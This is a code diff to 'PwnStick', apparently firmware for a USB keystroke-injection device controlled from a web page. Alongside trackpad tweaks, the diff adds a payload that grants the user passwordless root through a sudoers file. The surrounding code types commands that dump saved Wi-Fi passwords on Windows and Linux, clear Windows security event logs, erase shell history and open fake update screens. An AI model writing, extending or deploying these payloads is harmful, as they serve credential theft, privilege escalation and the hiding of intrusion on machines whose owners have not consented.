@@ -64,7 +64,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
-<title>PwnStick v51</title>
+<title>PwnStick v52</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <style>
 * { user-select:none; -webkit-user-select:none; box-sizing:border-box; }
@@ -107,7 +107,7 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
     <div id="m-list" class="modal-body"></div>
     <button class="modal-close" onclick="document.getElementById('modal').style.display='none'">CLOSE</button>
 </div>
-<div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL</div><div class="tab" onclick="sT('ig',this)">IMAGE</div></div>
+<div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL Center</div><div class="tab" onclick="sT('ig',this)">IMAGE Beamer</div></div>
 <div id="c-ctl" class="content active">
     <div class="row">
         <button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button>
@@ -180,14 +180,14 @@ ta.onkeydown=e=>{
     if(e.key==='Backspace'){ e.preventDefault(); wsS('B:1'); return; }
 };
 ta.oninput=e=>{ if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);} };
-// Trackpad - Fixed Relative Drag with Sensitivity
-let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0;
-p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); };
-window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS('C:l'); isD=false; };
+// Trackpad - Fixed Relative Drag with Sensitivity + Multi-touch Right Click
+let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0,maxT=0;
+p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); maxT=1; };
+window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
 p.onmousemove=e=>{ if(isD){ let dx=e.clientX-lX, dy=e.clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.clientX; lY=e.clientY; } };
-p.ontouchstart=e=>{ isD=true; lX=e.touches[0].clientX; lY=e.touches[0].clientY; tapT=Date.now(); };
-p.ontouchend=e=>{ if(isD && Date.now()-tapT<200) wsS('C:l'); isD=false; };
-p.ontouchmove=e=>{ if(isD){ let dx=e.touches[0].clientX-lX, dy=e.touches[0].clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.touches[0].clientX; lY=e.touches[0].clientY; } e.preventDefault(); };
+p.ontouchstart=e=>{ isD=true; lX=e.touches[0].clientX; lY=e.touches[0].clientY; tapT=Date.now(); maxT=Math.max(maxT, e.touches.length); };
+p.ontouchend=e=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
+p.ontouchmove=e=>{ if(isD){ maxT=Math.max(maxT, e.touches.length); let dx=e.touches[0].clientX-lX, dy=e.touches[0].clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.touches[0].clientX; lY=e.touches[0].clientY; } e.preventDefault(); };
 // Image Editor
 let scale=1,rotation=0,oX=0,oY=0,cvs=document.getElementById('crop-canvas'),ctx=cvs.getContext('2d'),curImg=new Image(),pD=0,cCvs=document.createElement('canvas'),cCtx=cCvs.getContext('2d');
 document.getElementById('img-f').onchange=e=>{
@@ -321,15 +321,18 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             else if(act=="cb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_BACKSPACE); delay(50); Keyboard.releaseAll(); }
             else if(act=="ps_admin") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('x'); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.print("a"); delay(1000); Keyboard.press(KEY_LEFT_ALT); Keyboard.print("y"); Keyboard.releaseAll(); }
             else if(act=="wifi_pass") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd"); delay(1000); Keyboard.println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
-            else if(act=="fake_upd") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1500); Keyboard.write(KEY_F11); }
+            else if(act=="fake_upd") {
+                if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1500); Keyboard.write(KEY_F11); }
+                else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); Keyboard.write(KEY_RETURN); delay(1500); Keyboard.write(KEY_F11); }
+            }
             else if(act=="note_ghost") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("notepad"); delay(1000); Keyboard.println("I am watching you..."); }
             else if(act=="win_clr") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
             else if(act=="win_info") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd /k systeminfo"); }
             else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
             else if(act=="lin_net") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("ip addr; nmcli device wifi list"); }
             else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("history -c && history -w && exit"); }
+            else if(act=="lin_sudo") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
             else if(act=="lin_wifi") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
-            else if(act=="lin_fake") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); Keyboard.write(KEY_RETURN); delay(1500); Keyboard.write(KEY_F11); }
             else if(act=="term") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd"); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(300); Keyboard.releaseAll(); } }
             else if(act=="calc") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("calc"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(1000); if(sp) Keyboard.print(" "); Keyboard.print("gnome-calculator"); delay(100); Keyboard.write(KEY_RETURN); } }
             else if(act=="rick") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(300); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); Keyboard.write(KEY_RETURN); } }
